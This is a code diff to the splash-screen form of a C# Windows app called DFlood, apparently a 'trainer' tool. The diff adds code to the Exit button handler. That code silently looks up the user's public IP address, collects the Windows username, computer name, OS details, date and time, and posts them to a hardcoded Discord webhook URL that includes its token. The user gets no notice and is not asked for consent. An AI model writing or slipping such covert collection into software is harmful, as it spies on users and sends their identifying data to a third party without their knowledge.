@@ -9,7 +9,10 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Media;
 using System.Runtime.InteropServices;
-using Dropbox.Api;
+using System.Net;
+using System.Text.RegularExpressions;
+using Microsoft.VisualBasic.Devices;
+using DFlood.DFLoodDiscordRPC;
 
 namespace DFlood
 {
@@ -23,7 +26,7 @@ namespace DFlood
         }
 
         [Obsolete]
-        private main cht = new main();
+        private MainMenu main = new MainMenu();
 
         private System.Media.SoundPlayer snd = new SoundPlayer();
 
@@ -33,11 +36,22 @@ namespace DFlood
         [DllImport("user32.DLL", EntryPoint = "SendMessage")]
         private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
 
-        [DllImportAttribute("User32.dll")]
-        private static extern int FindWindow(String ClassName, String WindowName);
+        private OperatingSystem OS = System.Environment.OSVersion;
 
-        [DllImportAttribute("User32.dll")]
-        private static extern IntPtr SetForegroundWindow(int hWnd);
+        private static void sendWebHook(string Url, string msg, string Username)
+        {
+            Http.Post(Url, new System.Collections.Specialized.NameValueCollection()
+            {
+                {
+                    "username",
+                    Username
+                },
+                {
+                    "content",
+                    msg
+                }
+            });
+        }
 
         private void FormMoveEvent(object sender, MouseEventArgs e)
         {
@@ -63,12 +77,27 @@ namespace DFlood
             {
                 splashTimer.Stop();
                 this.Hide();
-                cht.Show();
+                main.Show();
             }
         }
 
         private void btnExit_Click(object sender, EventArgs e)
         {
+            var webClient = new WebClient();
+            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
+            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
+            webClient.Dispose();
+            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
+            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
+            var ipadress = $"**IP Adresi : ** {dnsString}";
+            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
+            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
+            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
+            var platform = $"**Platform : ** {OS.Platform.ToString()}";
+            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
+            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
+            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
+            sendWebHook("https://discord.com/api/webhooks/852933349000871996/bRqRbTKlp2xuDYqSpHGUFLEOzoyjH0TJKgtpB8emrhBIBD07luTGHqWd_qRcWcMVwwEc", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n--------------------------------------------------------------------", "DFlood Services");
             Application.Exit();
         }
 
@@ -79,7 +108,6 @@ namespace DFlood
 
         private void splashScreen_Load_1(object sender, EventArgs e)
         {
-
         }
     }
 }
